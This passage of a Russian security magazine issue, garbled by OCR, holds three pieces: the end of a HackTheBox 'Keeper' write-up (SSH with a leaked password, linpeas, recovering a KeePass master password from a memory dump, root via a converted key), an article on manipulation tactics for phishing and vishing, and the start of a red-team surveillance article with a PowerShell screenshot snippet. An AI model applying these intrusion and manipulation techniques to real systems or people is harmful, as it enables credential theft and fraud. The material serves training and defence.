для перебо ра, это тоже рабочий вектор.





                 Профиль поль зователя lnorgaard

В про филе пользователя lnorgaard мы находим не то что какую-то информа-
цию, а целый пароль: Welcome2023!. С именем пользовате ля и паролем
получается авто ризоваться по SSH и заб рать поль зовательский флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь пора соб рать информа цию о системе, запущенных процессах,
необычных файлах и прочих вещах, которые помогут нам най ти возможность
для повыше ния привилегий до рута. Я для это го использую скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Давай ска чаем самую свежую версию скрип та для Linux:


wget https://github.com/carlospolop/PEASS-ng/releases/latest/
download/linpeas.sh -O /tmp/linpeas.sh

Те перь нужно загрузить его на уда ленный хост. Для этого можно исполь-
зовать стан дартные средс тва SSH. Пос ле заг рузки необ ходимо дать скрипту
право на выполнение и выполнить его.


scp /tmp/linpeas.sh lnorgaard@keeper.htb:~/
chmod +x ~/linpeas.sh
~/linpeas.sh

В выводе — масса информа ции, поэтому нужно отоб рать только значимую.
К сожале нию, интересного не так много. Разве что в домашнем катало ге
поль зовате ля нашелся какой-то архив RT30000.zip, оставленный рутом.





     Файлы поль зователя root в домаш них каталогах поль зователей

Также я всег да заг ружаю на хост утилиту pspy64, которая поз воляет в реаль-
ном времени отслеживать выполняемые команды и процес сы, запускаемые
от имени любого, даже привилегирован ного поль зователя. Увы, я прождал
пять минут и ничего интересного не обнаружил.
  Воз вра щаемся к найденному архи ву и скачиваем его на свой хост стан-
дартными средствами SSH.


scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip ./

Внутри архи ва находим базу данных менеджера паролей KeePass passcodes.
kdbx, а также, судя по названию, полный дамп работающего процесса этого
менеджера паролей — KeePassDumpFull.dmp.





                Содержимое архива RT30000.zip

На ум сразу приходит недавняя уязвимость CVE-2023-32784.


Чи тай так же о взло ме KeePass:
 • Уяз вимость в KeePass позволяет похитить все пароли поль зователя в виде
   простого тек ста
 • Неисправ ленная проблема в KeePass поз воляет узнать мастер-пароль
 • Вы зов мастеру клю чей. Инжектим шелл-код в память KeePass, обойдя
   анти вирус



Де ло в том, что в KeePass 2.x до версии 2.54 есть возможность вос становить
мастер-пароль в откры том виде из дампа памяти, даже если рабочее прос-
транство заб локировано. Также есть возможность вос становить пароль, если
KeePass боль ше не работа ет. Дамп мож но получить не только дампингом
памяти процесса KeePass или всей сис темы, но и из файла подкачки
(pagefile.sys) и фай ла гибер нации (hiberfil.sys). Но есть и ограничение:
пароль дол жен быть наб ран с клавиату ры, а не скопирован из буфера обме-
на.
  О спо собе восстановления пароля из дам па я уже писал в своем канале.
Давай повторим этот метод, для чего будем исполь зовать KeePwn.


# install
git clone https://github.com/Orange-Cyberdefense/KeePwn.git
cd KeePwn
pip3 install -r requirements.txt
sudo python3 setup.py install


# run
KeePwn parse_dump --dump_file KeePassDumpFull.dmp --bruteforce
passcodes.kdbx





           Ре зультат восстановления мастер-пароля KeePass

Спустя несколь ко минут работы программа завершает свое выполнение.
Мастер-пароль подоб рать не удалось, одна ко мы получи ли 13 приблизитель-
ных кандидатов. Я загрузил последний вариант, так как он может навес ти нас
на более полную информацию о пароле. Однако поисковый движок пред-
ложил другой вари ант поиска.





                    Результат поиска в Google

Сог лашаемся на изме ненный поиск и получа ем похожую на нашу стро ку фра-
зу rødgrød med fløde.





                    Результат поиска в Google

Из Google узнаём, что это наз вание популяр ного в Дании киселя, но куда важ-
нее, что это и есть мастер-пароль, который поз воля ет получить дос туп к дан-
ным в базе KeePass. Видимо, из-за использования сим вола ø KeePwn не смог
довести дело до конца.





                  Содержимое базы KeePass

В базе сох ранен пароль рута и SSH-ключ в фор мате PuTTY. С паролем авто-
ризовать ся не вышло, поэтому конвертируем ключ.


puttygen key.putty -O private-openssh -o id_rsa_root

Те перь с ключом id_rsa_root авто ризуемся по SSH и забираем последний
флаг.





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





Со циальную инженерию час то при меняют
при ком плексных пентестах, и зачастую
успешно, но, понимая принципы психоло-
гии и сос тавив сценарий с их учетом, мож-
но   значительно   повысить   процент          Антон Бочкарев                                                                                      Основатель 3side.org,
успешных взаимо действий. В этой статье          пентестер/редтимер,                                                                                    социальный инженер,
мы разберем основные уловки и причины,          кибербезопасности.популяризатор
по которым они работа ют.                                          Antxakk@gmail.com


«Вечная точка входа!», «Столько-то про центов атак начинается с соци альной
инже нерии!», «Нель зя недо оценивать возможности фишинга!» — это всё
донельзя заезженные в ИБ фра зы. А что важно для эффективного про бива?
   Тут мнения рас ходят ся. «Главное — это кре атив, это же соци алоч ка!»,
«Нет, главное — это хороший пей лоад, макросы, сплоиты на MS Oﬃce,
а документ кто-нибудь да откроет». И обя затель но кто-то добавит: «Парни,
не заморачивай тесь! Рассылаем OWA, вве дут пароли, а с учетками и почтой
рас крутимся».
  Важ ны обе части — и «социо», и «техничес кая». На мой взгляд, это должно
быть понятно пря мо из названия. Но если с тех нической сто роной обычно все
хорошо, сплоиты пишутся, воркшо пы крутят ся, то с «социо» у нас проблемы.
Системные.
  Ты видел, чтобы к другим видам пен теста был такой же подход, как к соци-
аль ной части социалки? Бессистемный и зачастую повторяющий только то,
что уже было сде лано раньше более опыт ными кол легами?
   Толь ко представь: фаззим поле, не понимая, как оно работает и почему
так отвечает, прос то ждем, что что-нибудь да выполнится, потому что все так
дела ют.
  С соци альными скиллами у многих хакеров и в обычной-то жизни не очень,
потому они и тяготеют к технике. А тут уж и подав но при ходит ся выходить
из зоны ком форта. Кто-то еще в этот момент пытается отмахнуться и сказать:
«Пси хология не наука!»
  Äèñêëåéìåð. Åñëè òû ñ÷èòàåøü, ÷òî ïñèõîëî ãèÿ íå íàóêà, òî
ýòà ñòàòüÿ íå äëÿ òåáÿ.
  Остальным же доб ро пожало вать!
  Основа соци альной инженерии — психология влияния. Но хоть психоло-
гия и наука, вокруг нее крутится множество псевдона учных течений: НЛП,
физи огномика, сомнительные тех ники, маскирующиеся под психологию сект,
и многое-многое другое. Поэтому...
  Äèñêëåéìåð 2. Àâòîð â ñòàòüå îïèðàåòñÿ íà èñêëþ÷èòåëüíî

ïðèíÿòûå è ïðî âåðåí íûå â íàó÷ íîì ñîîá ùåñòâå òåîðèè, èññëå-

äîâàíèÿ è ïóá ëèêàöèè. À òàê æå àíàëèçèðóåò ñîáñòâåí íûé îïûò

ñîöèàëüíîé èíæå íåðèè ÷åðåç ïðèç ìó ïîäîá íûõ òåîðèé.
   Эта база опи рает ся в первую очередь на иссле дова ния социальных пси-
холо гов XX и XXI веков, а также сов ременные зарубежные и рос сийские
иссле дования о под верженности мошенничес тву.


ÝÂÎËÞÖÈÎÍÍÎÅ ËÅÃÀÑÈ

Представь себе при ложение с неким API, которое развивалось на протяже-
нии мно гих-многих лет, но никто его никогда не переписывал и лишь добав-
лял всё новые и новые функции. Раз работчики и задачи менялись, поэтому
никто до кон ца не понимает, что там за легаси-код. В ста рые фичи никто
не лез, никако го ревью не делал, прос то дописывали новые, когда возникала
необходимость. Железо тоже не апгрей дили, и, что бы сохранять эффектив-
ность, при ходилось добавлять оптимиза цию путем пропуска части про верок.
Этакое «спе кулятив ное исполнение».
   Это при ложе ние — наш мозг, раз вивший ся в про цессе эво люции.
  Зачастую наиболее уяз вимы те механизмы, которые наши предки исполь-
зовали для выживания на самом раннем этапе ста новления человеческого
общества. Полностью избавить ся от этого наследия мы не можем, можем
лишь пытаться контро лировать себя, закрывая  к ним доступ на более
высоком уровне мыш ления, но в глубине каж дый человек уязвим.


ÊÒÎ ÓßÇÂÈÌÅÅ?

Когда чита ешь СМИ, кажется, что уязвимее всего пенсионе ры. Но это лишь
потому, что исто рии об обма нутой бабуш ке вызывают наибольший эмо-
циональный отклик, вот их и исполь зуют в СМИ.
  На деле же вот статистика Европола по жертвам мошенничеств, обратив-
шимся в полицию:
 • 18–34 года — 27,7%;
 • 35–54 года — 23,4%;
 • 55–64 года — 21,7%;
 • 65+ лет — 18,5%.

Но ведь мно гие в полицию не обра щаются, верно? Поэтому пос мотрим
на ста тистику, получен ную с жес тких дисков сервера бывшего мошенничес-
кого кол-центра в Бердянске:
 • 20–29 лет — 23%;
 • 30–39 лет — 44%;
 • 40–49 лет — 19%;
 • 50–59 лет — 12%;
 • 60+ лет — 2%.

Статистика иная, но тоже совсем не в пользу молодежи.
  Âîç ðàñò íå óâå ëè÷èâàåò âåðî ÿòíîñòü îáìàíà, à ñêî ðåå íàîáî-
ðîò.

  Óðî âåíü êîãíèòèâíûõ ñïî ñîá íîñòåé? Íå âëèÿåò.
  Совместное  иссле дова ние  несколь ких американских  вузов  с  учас-
тием 1220 человек не обнаружило корреляции между уровнем когнитивных
спо собностей и вероятностью стать жер твой мошен ничес тва.
  Отдельно сто ит вспомнить кейс 68-летнего специалиста по физике эле-
ментарных частиц Пола Фрэм пто на, кандидата на Нобелевскую премию. Его
с помощью баналь ного мошен ничес тва через сайт знакомств зас тавили поп-
робовать про везти через гра ницу чемодан с дву мя килограммами кокаина!
Неудач но для него.
  Ñïå öèàëèñòû ïî áåçîïàñíîñòè íàèáî ëåå «óñòîé÷èâû» ê ñîöè-

àëüíîé èíæå íåðèè? Íå ñîâñåì.
  С одной сто роны, мы, интересу ющиеся соци альной инже нери ей, обра-
щаем внимание на подоб ные тех ники и нам про ще их заметить. Одна ко нас
в какой-то степени «ослепляет» эффект сверхуверенности. Мы убеждены, что
сами уж точно всё пой мем и на нас-то это не сра бота ет! Это извес тное ког-
нитивное искажение, которое проявляется во мно жестве профессий. К при-
меру, по статистике:
 • опытные водители чаще попадают в серьезные ава рии;
 • опытные пловцы тонут чаще;
 • опытные электрики чаще получают травмы от ударов током.

Âû âîä: ñ ïîìîùüþ ñîöèàëüíîé èíæå íåðèè ìîæ íî ýôôåêòèâíî

ïðî âîäèòü àòàêè íà ëþáûå ñîöèàëüíûå ãðóï ïû, âàæ íî ëèøü ñîç-

äàâàòü ïîä õîäÿùèå ñöå íàðèè.
  О сце нари ях мы погово рим далее.


ÓßÇÂÈÌÀß ÎÏÒÈÌÈÇÀÖÈß

Объем нашего мозга не менялся уже нес колько тысяч лет. Представь, что
у земледельца из Древней Греции мозг был точ но таким же. Но объем
информации, которую он обрабатывал ежедневно, не идет ни в какое срав-
нение с современной наг рузкой. И благодаря прогрессу она растет гораздо
быстрее, чем эволюционно подстраивает ся наше «железо».
   Как же наш мозг справляется с этим? Использует уже выработанный нес-
колько тысяч лет назад механизм оптимизации ñòå ðåîòèïíî ïîñëåäîâà-
òåëüíîå ïîâåäå íèå (ÑÏÏ). СПП позволя ет нам принимать решения áåç
àíàëèçà ситуации на осно вании прош лого опыта и некоего провоцирующего
фактора. Это значительно экономит ресурсы, уво дит рутинные процес сы
в «фоновый режим» и поз воляет заодно обдумывать что-то. Это короткий путь
обработ ки информа ции, в то время как анализ — длинный. Нашим предкам
такая оптимизация неоднократно помогала и спасала жизни в ситу ациях, где
на анализ не было вре мени. Эво люци онно это выгодно!
   Автоматичес кая, стереотип ная форма поведения превали рует над все ми
остальными формами поведения,  потому  что она энергосберега ющая
и самая эффективная в большинс тве случаев. Она позволяет экономить огра-
ниченные ресурсы моз га.
  От него нельзя ожи дать, что он успеет проанализировать и обдумать все
аспекты жизни, все события, ситуации, кон такты даже в рамках одного дня
любого из нас. Он быстро классифицирует событие по ключевым деталям
(провоци рующим фак торам) и реагирует.
  Но когда это поведение нас подводит? В тех ситу ациях, когда наш опти-
мизи рованный мозг выбира ет на осно вании про воцирующе го фак тора
неверную модель поведения. Ошиб ка классификации.
  Пример. Социальный психолог из Гар варда Эллен Лангер провела экспе-
римент «Оче редь к ксероксу». По нему человек пытал ся пройти к копироваль-
ному аппа рату без очереди, используя для это го три вида просьб:
 • Без объясне ния при чины («Можно я прой ду без оче реди?») — 60%
   положительных отве тов.
 • С логич ным объяснением («Мож но я пройду без очереди? Потому что я
   очень тороплюсь и у меня всего пара страниц») — 94% положительных
   отве тов.
 • С иллю зией объ яснения («Мож но я пройду без очереди? Потому что мне
   нужно сде лать копии») — 93% положитель ных отве тов!

Провоци рующим фактором в этой ситуации было не само объяснение и его
обос нованность, а лишь наличие объясне ния — союз «потому что». Мы уяз-
вимы к ультра нор мальным сиг налам — провоцирующим факторам, и эту уяз-
вимость мож но эксплуатировать, даже для вызова поведе ния, противореча-
щего здравому смыслу.


DOS ÌÎÇÃÀ

Са мый простой спо соб вклю чить «энергосберегающий режим» — эмо-
ционально или сенсорно перегрузить мозг челове ка.
  Эмо циональная перегрузка опи рается на силь нейшие эмоции, вызыва-
ющие стресс или эйфорию. Напугать, ввести в тревожное состояние —
и жертва будет гораздо хуже про тиво действовать и соображать, будет
работать на автомате в соот ветс твии со сво ими автоматически-стереотип-
ными реакциями. Мож но, конечно, и сильно обрадовать, но обыч но слож нее
этого дос тичь и под держивать эффект.
  Сен сорная перегрузка работает ина че, и ее мож но использовать совмес-
тно с эмо циональной. Она базируется на перегрузке информацией из раз ных
источников, которой становит ся слиш ком много, что бы обра ботать. Голова
очень плохо соображает, когда ты пишешь какой-то документ, тебя отвлекает
вопросами коллега, а где-то на фоне приходят еще и уве домления от телег-
рама. Часть каналов мозг будет затыкать имен но при помощи СПП. В таком
состоянии и на ссылку лег ко нажать, и ввести дан ные не туда, и довериться
зво няще му тебе по телефо ну.
   Та ким методом часто действуют груп пы цыган. Исполь зовать сочета ние
из эмо циональной и сенсорной перег рузки — это их клас сика. Вок руг жертвы
кружится толпа, хватают за руки и дергают за сум ку дети, говорят в несколько
голосов, осо бен но выделяют страш ные слова «беда у тебя». Это называют
«цыганский гипноз», но на деле их задача — выз вать СПП, а дальше под-
держивать эффект. Выйти из подоб ного сос тояния самос тоятельно может
быть сложно, и луч шая защита — не дать себя первоначально задосить.
  Â îáî èõ ñëó ÷àÿõ êðèòè÷åñêîå ìûø ëåíèå, êàê êðàéíå ýíåðãîçàò-

ðàòíûé äëÿ ìîç ãà ïðî öåññ, áóäåò çíà÷èòåëüíî ñíèæåíî èëè âîâñå
îòêëþ÷åíî.


ÍÀÈÁÎËÅÅ ÏÐÈÌÅÍÈÌÛÅ ÏÑÈÕÎËÎÃÈ×ÅÑÊÈÅ ÝÊÑÏËÎÈÒÛ

Пси холо гия влияния описывает множес тво принципов, которые исполь зуют ся
повсеместно: в мар кетинге и рекламе, про дажах, политтехнологиях, психоло-
гии и терапии и многих дру гих областях. Но для хакера, составля ющего текст
рас сылки или скрипт для телефонного фишин га, будут применимы лишь три
из них:
 • принцип авторите та;
 • принцип дефици та;
 • принцип последовательности.


Ïðèíöèï àâòîðèòåòà
Че ловек скло нен к тому, чтобы ориентироваться на экспертов в той области,
в которой сам недостаточно ком петен тен. Мы авто матически больше доверя-
ем тем, кто, по нашему мнению, более квалифициро ван, богат или успе шен.
Но как про верить авторитет? В этом и кро ется глав ная уязвимость.
  Фейковый авто ритет можно поддерживать с помощью внешних признаков.
Люди в белых халатах по телевизору изоб ража ют сто матологов и рекламиру-
ют зуб ную пасту, инфоцыгане продают «успешный успех», позируя в высотках
Дубая и дорогих тачках, которые зачастую сняты лишь на час для фотосес сии.
Одна  известная  сеть  ресторанов  исполь зовала  акте ра,  игравше го
шеф-повара в популярном сериале «Кух ня», для рекламы. Ведь для боль-
шинства в голове он «шеф», а не актер, а зна чит, пло хой ресторан не посове-
тует!
   Хо роший пример демонстрации это го принципа — экспе римент Мил грэ-
ма. Его проводили в 1963 году в Йель ском универ ситете, и про водили в нес-
колько этапов, меняя условия. В нем было наг лядно показано, что испы-
туемые вне зависимос ти от усло вий в большинстве слу чаев повинуются авто-
ритету, нарушая даже свои моральные прин ципы.
  Эволюционно мы разделяли виды труда и привыкли доверять экспер там.


Ïðèíöèï äåôèöèòà
Здесь речь о желании того, что недос тупно, боязни упустить или потерять
что-то. Люди всегда больше ценят то, что нельзя приобрести. Кажется, что
вещи, которые быс тро раскупают и слож но найти, более полезны.
  В СССР дефицит ный товар и особен но товар из-за границы казал ся
более ценным и полез ным, даже если усту пал по свойствам доступным
советским. Акции «осталось всего три штуки» на маркетплейсах эксплуати-
руют тот же эффект.
   Когда я работал пентесте ром в одном извес тном интеграторе в Москве, я
ежедневно выходил из мет ро «Савелов ская» и проходил мимо магазина
одежды. И каждый день у него висели баннеры о «лик видации», громкогово-
рители кри чали, что именно сегодня «пос ледний день зак рытия магазина».
Но это «сегодня» затяну лось на целый год, после чего магазин прос то провел
реб рендинг. На кого была рассчитана реклама? На тех, кто видит вывеску
впервые, и, судя по ста бильному потоку покупа телей, трюк работал.
  Манипу ляции в духе «вы можете потерять» тоже относятся к принципу
дефици та. Жизнь при учи ла наших пред ков не упус кать возможности добыть
что-то, пока это доступно, и запасать ся.


Ïðèíöèï ïîñëåäîâàòåëüíîñòè
Это один из самых неоче видных и эффективных принципов манипуляций.
Эво люци онно мы боль ше стре мим ся быть пос ледовательными, чем правыми.
Кажет ся чушью, но общество край не поощ ряет пос ледова тельность во взгля-
дах. Человек, пос тоянно меня ющий свое поведе ние, свои взгляды или,
как час то сейчас говорят, «переобувающий ся», считается ненадежным, дву-
личным, лег комысленным. Такое поведение осуждалось и осуждает ся общес-
твом до сих пор. Человек пос ледова тельный ассоциируется с надежностью,
предска зуемостью, ему больше симпатизи руют, даже если он в итоге ока-
зывается не прав.
  Придерживать ся одной линии поведения для человека край не соблазни-
тель но, ведь это позволя ет не разоча ровы вать ся или сомневать ся в себе,
наобо рот, подкреп ляет уверенность. И несомненно, позволяет гораз до
мень ше думать! Ведь такой путь гораздо экономич нее, а значит, именно
к такому поведе нию нас толкает стереотипно-последователь ное поведение.
Морально про ще идти до кон ца и ва-банк, и, кстати, именно с этим прин-
ципом в первую оче редь старают ся бороться игро ки в покер!
  Мно жество экспе риментов подтвержда ют влияние принципа последова-
тель нос ти. Нап ример, социальный психолог Патриция Плинер проводила
эксперимент, в котором сначала про сила испы туемых носить значок «Под-
держи общество по борьбе с онкологи ей», а потом внес ти пожертво вание
в одно именный фонд. Среди тех, кто носил зна чок, желающих внес ти пожер-
тво вание было в два раза больше, чем в груп пе, которую не просили носить
зна чок.
  Причем после негативной обратной связи вероятность и желание «дойти
до конца» возраста ет. Например, однажды исследователи пришли на псев-
донаучный семинар, где слу шателям обе щали реализацию их желаний
и излечение от всех болезней, если они купят определенный курс. В конце
семинара иссле дователи начали  активно  задавать вопросы, подчерки-
вающие несостоятельность всех аргументов мошенников, но вызвали тем
самым совсем не ту реакцию, которую ожидали.
   Слушатели семина ра с каж дым следующим вопросом все активнее шли
и отдавали свои деньги! Люди начина ли ощущать, что их меч ты и иллюзии
рушатся, они боялись потерять шанс и шли до конца. Страх разоча рова ния
рождал стресс, включалось СПП, и стремление к последовательности под-
меняло критическое мыш ление — в том чис ле к собственным дей стви ям!


ÝÊÑÏËÓÀÒÀÖÈß

Как же использовать  эти прин ципы, СПП и провоци рующие факторы
для манипуляций в контексте социальной инже нерии?
  Оче видно, что наибольший эффект подобные техники показывают именно
в фишин говых звонках, ведь звонок позволяет полноценно выс троить пос-
ледовательность действий и общаться с жертвой в несколько этапов.
  При почтовом фишинге эти техники помогают более тонко составить
фишин говое письмо. Тогда его конверсия име ет шансы прев зойти показа-
тели стан дартных сценари ев.


Ïèñüìà è ïðàâèëî 7%
В ходе множес тва проектов по соци отехническому тестированию на проник-
новение мы с коллегами неоднократ но замеча ли, что на объемах боль-
ше 1000 писем не менее 70 получателей обя зательно откроют письмо
и выполнят целевое действие.
  Процент мог быть и выше, но, даже если ком пания активно занималась
обучени ем сотрудни ков противо действию фишингу, с учебными рассылками
и переобучениями попав шихся, про цент не падал ниже семи. Какие бы обу-
чающие активнос ти и организационные меры компания ни вводила, добиться
сни жения не удавалось. Почему?
  Потому что 7% поль зователей на момент рас сылки были в уяз вимом сос-
тоянии, они были в сенсорной или эмо циональной перегрузке! СПП отклю-
чало их кри тическое мышление, и до ана лиза письма мозг просто не доходил,
а без ана лиза все тре нинги и обучения не помогают.
   Но, как ты понимаешь, процент мож но было поднять выше, если спро-
воцировать подобные состояния уже самим письмом. Пись ма, провоци-
рующие стресс или эйфо рию, всег да наибо лее эффектив ны.


Òåìíàÿ ñòîðîíà òåëåôîííîãî ôèøèíãà
Лучший, хоть и негативный при мер эффективного телефонного фишинга —
это мошен нические кол-цен тры. Они существу ют с 2014 года и отточили свои
сце нарии и технику с фокусом на массовые атаки. Определен ный про цент их
жертв, находясь в уязвимом состоянии в момент поднятия трубки, —
это гаран тированный зарабо ток. Их схе мы нам кажутся простыми и смеш-
ными, но они и не рассчитаны на вклю чен ное критичес кое мыш ление и ана-
лиз. Они нацеле ны на определенный процент людей, у которых сработает
СПП.
  Давай на их примере разберем наиболее эффективные техники и приемы
при фишинговых звонках. Вот как мошенники акти вируют СПП:
 • С помощью стресса и стра ха. Сценарии с «сотрудником банка» и тем
   более  с  «сотрудником правоохранитель ных  органов»  автоматичес ки
   вызывают стресс.
 • Не дают положить трубку, моментально перезванивают. Выматывают
  самим звонком, могут держать на труб ке часами.
 • Уси ливают дав ление по ходу звонка, торопят.

Са мые свежие сценарии вклю чают СПП с помощью сообщения с фей кового
аккаунта руководства, без времени на переп роверку.
   Также мошенники активно используют принцип дефицита, например
говорят о воз можности потерять деньги, если не помогать. Иногда даже
предлагают какую-то наг раду за «помощь следствию».
  Используют принцип авторитета:
 • Го ворят максимально усложненными формулировками и терминами, пос-
   ле чего спрашивают: «Вам все понятно?», подчерки вая свою экспертность
   и загружая мозг жертвы. При мер из реального звонка: «После вашего
   голосового отказа мы сформировали протокол, который обязует провести
   обновле ние данных по системам безопасности на юри дическом уровне
   и пре дос тавить вам полную замену реквизитов вашего сче та для более
   безопасного пользования средствами в системе нашего бан ка. Это вам
   понятно?»
 • Представ ляют ся как сотрудни ки максимально могущественных ведомств
   (ФСБ, СК РФ, ЦБ РФ), сооб щают неп роверя емые ФИО и зва ния.

Ак тивно исполь зуют прин цип последовательнос ти:
 • В начале задают исключительно безопасные для жертвы вопросы. «Теряли
   ли вы паспорт в пос леднее время?» и прочие.
 • Далее  перехо дят  к  воп росам  без  односложных  отве тов,  но  все
  еще безопасных для жертвы. «Какими бан ками вы еще поль зовались?»,
   «Куда вы предоставляли ваши паспортные данные за последнее время?»
 • Далее к более опасным вопросам и безопасным действиям. «Посмотри те,
   какие пластиковые карты  у вас сейчас на  руках», «Возьмите ручку
   и запиши те мое ФИО, я сле дова тель... отдел № 7 УВД ... района».
 • Жертва привыкает отве чать на вопросы и делать какие-то действия
   по указке, градус опасности действий и ответов повышается. Жертве всег-
   да сооб щают лишь о сле дующем действии, пол ностью замысел не рас-
   кры вает ся. Даже, казалось бы, в очевидных ситуациях.
 • При попытках сопротивления усиливают последовательность бîльшим
   количеством вопросов и дей ствий, помимо уси ления эмо ционального
   дав ления.
 • Именно последовательность позволяет под вести жертву к столь опасным
   поступкам,   как   совершение   поджогов   (более   30   случаев
   за 2022 и 2023 годы).

К слову, подобные группы работа ют не только в Европе и СНГ, не меньше
зво нят и граж данам Южной Кореи. Это общемировой тренд.


Òåõíèêè îáõîäà òðèããåðîâ
У боль шинства пользователей есть похожий набор триггеров, которые сра-
баты вают даже при СПП. Это, как пра вило, простейшие инструкции, которые
вызывают автоматичес кую реакцию. Но триг геры эти возможно обой ти:
 1. Правило «никому не говорите свой пароль» обходит ся легко: пентестер
   может, к при меру, отправить ссылку для генера ции «безопас ного» пароля
   (страница по ссылке будет содержать логгер). Либо попросить жертву
   выполнить команду командной строки, которая не будет понятна жертве,
   но приведет к сме не пароля.
 2. Правило всегда проверять, кто пишет или зво нит, обходит ся подписью
   в письме или представлением в самом начале звонка. Сами ФИО пойдут
   проверять еди ницы.
 3. Эффект первого или неожиданного звонка всегда вызывает насторожен-
   ность, но если сде лать такой звонок крат ким и максимально безопас ным,
   а затем пообе щать при необ ходимос ти перезвонить, то на втором звонке
   эффект пройдет уже через 10–15 минут. Эта техника называ ется «двой ное
   касание».
 4. Стро гие правила ком пании мож но попробовать обойти выводом жертвы
   за рамки рабочего контекста. Например, на пентесте мы с коллегами при-
   сылали сот рудницам заказ чика цветы в офис с личным подарком «от пок-
   лонни ка» в виде флеш ки, перевя занной лен той. Любопытс тво было нас-
   толь ко велико, а подарок настолько не ассоцииро вал ся с работой,
   что 100% получатель ниц не доносили ее до дома и вставляли в рабочий
   компьютер. Аналогич но и с коммуникацией в мес сендже рах и соци альных
   сетях: они вос принимаются исклю чительно как личные, вне рабочего кон-
   текста.


ÇÀÙÈÒÀ

Для ком паний луч ший способ защиты от применения соци альной инже-
нерии — это исполь зовать и орга низацион ные, и технические меры одновре-
менно, а еще дополнить их опе ративным реагирова нием.
  Организацион ными мерами мож но сни зить про цент попавшихся на уловку
поль зовате лей примерно до 7%. Эффективные техничес кие меры могут пре-
дотвратить дальнейшие действия попавшихся на рассылку или звонки поль-
зователей. Но все же при пра виль ной «работе» с пользователем соци аль ный
инже нер способен обой ти мно гие технические меры. В таком случае в ход
идет опе ратив ное реаги рование на инцидент.
  А как защищаться от подоб ного обычному челове ку?
 • Не бояться быть неудобным при разговорах по телефону. Хамить и отка-
   зывать безопаснее.
 • Приучить себя отсле живать свое пог ружение в стресс и сте реотипное
   поведе ние. Стресс заметен всегда, нужно старать ся не принимать никаких
  решений под стрессом, только пос ле передыш ки.
 • Сле дить за пос ледовательностью действий, не ввязываться в сом нитель-
  ные коммуникации.
 • Обращать вни мание на манипуляции, которые мы обсу дили, научиться их
   замечать в повседневной жизни.
 • Бросать труб ку при подозрительных звон ках и не пытаться проверить зво-
  нящего! Если ты бросишь трубку, шанс того, что тебя обма нут, становится
   рав ным нулю, но, если будешь троллить или проверять звонящего, он ста-
   нет ненуле вым.


ÂÛÂÎÄÛ

Пентестеру в ходе любых проектов по фишин гу стоит держать в голове
основные моменты:
 • Последовательность — твой друг, с каждым действи ем жертве будет
   слож нее ее остановить. Это сильнейший вид манипуляции, но он тре бует
   времени и терпения!
 • Те бе не нуж но про ходить все проверки жертвы и составлять идеаль ный
   сце нарий! Если тебя начнут проверять, зна чит, ты уже проиграл.
 • Ввод жертву в сос тояние стереотипно-пос ледова тель ного поведения —
   лучший спо соб отклю чить кри тичес кое мышление и предотвратить «про-
   верки».
 • Обход самых распространенных триг геров упрощает достижение цели.
 • Используй принцип авторитета, лучше казаться не совсем понятным про-
  фессионалом.
 • Применяй прин цип дефицита, если он уместен в сценарии.
 • Для провокации СПП стресс гораз до про ще под держивать, чем эйфорию.
  Но УК РФ действует и во время пен теста, и часть методов (например, шан-
   таж) переходят черту. Помни об этом!
 • Рас сылки сто ит проводить в наиболее загруженные дни и вре мя, тогда
   тебе на руку будет играть сен сорная перег рузка сот рудников.
 • Креатив важен, если ты понимаешь, что именно у тебя в «соци опей лоаде».

Таргетирован ные атаки, к сожале нию, выходят за рамки этой статьи. Заранее
изучив  кон крет ную персону,  ты можешь  значительно  повысить шансы
на успех. Но по моей практике такие услуги заказы вают достаточно редко,
а для массовых атак наша инди виду альность слишком незначитель на.
  Не существует ни одной тех ники или сценария, которые бы гарантирова ли
успех, но не существует и гаран тированной защиты от подобных атак. Все мы
останемся уязвимы, это слиш ком глубоко в нас заложила эволюция.
  И не могу не напомнить, что большая сила — это большая ответс твен-
ность! Не исполь зуй материал статьи во вред.
КОДИНГ





При редтиминге иногда при ходится изучать
обстанов ку не только внутри сети, но и
за ее пределами. В частности, по ту сто-
рону  монито ра.  Работа ет  ли   кто-то
за устройством в текущий момент, какое         MichelleVermishelle                                                                                       @Michaelzhm
окно открыто, что говорят в мик рофон.        michael.zhmailo@yandex.ru
Давай пос мотрим, как можно, используя
легитим ные возможности сис темы, следить
за ничего не подозревающим пользовате-
лем.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Большая часть того, что мы реали зуем в этой статье, есть толь ко в Metasploit
и в Cobalt Strike. Первый написан на Ruby, а исходни ки вто рого закрыты. Дру-
гих реали заций я с ходу и не назову, а ведь хочется иметь короткие и аккурат-
ные примеры кода, которые можно без проблем добавить в собственную
программу.
  Впрочем, у меня получи лось самостоятельно все реализовать на C#,
а некоторые программы — на C++ и PowerShell.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



               КАК УСТРОЕНЫ СРЕДСТВА
       СЛЕЖЕНИЯ ЗА ПОЛЬЗОВАТЕЛЯМИ





ÑÊÐÈÍØÎÒ ÐÀÁÎ×ÅÃÎ ÑÒÎËÀ

Первоочередная задача — скриншоты. Нуж но увидеть, что откры то у текуще го
поль зовате ля, в каких прог раммах он работа ет и чем сей час занимается.
   Казалось бы, такая тривиальная задача дается в восьмом классе в качес-
тве летней домашки на пас кале, но не тут-то было. Авторы множества реали-
заций забывают об одной интерес ной детали. Догадал ся, о какой?
  Пока думаешь, покажу тебе пример кода на PowerShell. Даже с его
помощью можно сделать скриншот текущего рабочего стола.


# Отправляем нажатие клавиши Print Screen, которое сделает скриншот
всех экранов
[Windows.Forms.SendKeys]::SendWait("{PRTSC}")


# Даем системе время, чтобы обработать нажатие клавиши и получить
